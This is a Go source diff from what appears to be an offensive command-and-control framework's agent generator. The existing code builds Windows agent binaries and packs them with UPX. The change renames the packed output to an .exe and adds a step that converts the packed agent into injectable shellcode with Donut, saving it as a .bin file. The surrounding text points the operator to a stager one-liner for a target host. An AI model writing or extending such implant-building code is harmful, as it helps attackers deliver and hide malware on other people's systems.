@@ -79,6 +79,7 @@ func modGenAgent() {
 		outfile = fmt.Sprintf("%s/agent_windows_%s_%d-%d-%d_%d-%d-%d.dll",
 			EmpWorkSpace, arch_choice,
 			now.Year(), now.Month(), now.Day(), now.Hour(), now.Minute(), now.Second())
+
 	default:
 		CliPrintError("Unsupported OS: %s", os_choice)
 		return
@@ -146,7 +147,7 @@ func modGenAgent() {
 	agent_binary_path = outfile
 
 	// pack it with upx
-	packed_file := fmt.Sprintf("%s.packed", outfile)
+	packed_file := fmt.Sprintf("%s.packed.exe", outfile)
 	err = upx(outfile, packed_file)
 	if err != nil {
 		CliPrintWarning("UPX: %v", err)
@@ -170,6 +171,20 @@ func modGenAgent() {
 	agent_binary_path = packed_file
 	CliPrint("Generated agent binary: %s."+
 		"You can `use stager` to generate a one liner for your target host", agent_binary_path)
+
+	// Generate shellcode using donut for the executable files
+	shellcode, err := DonutShellcodeFromFile(agent_binary_path, arch_choice, false, "", "", "")
+	if err != nil {
+		CliPrintError("Donut: %v", err)
+		return
+	}
+	shellcode_path := fmt.Sprintf("%s.bin", packed_file)
+	err = os.WriteFile(shellcode_path, shellcode, 0o644)
+	if err != nil {
+		CliPrintError("Failed to save shellcode: %v", err)
+		return
+	}
+	CliPrint("Generated shellcode: %s", shellcode_path)
 }
 
 func MakeConfig() (err error) {
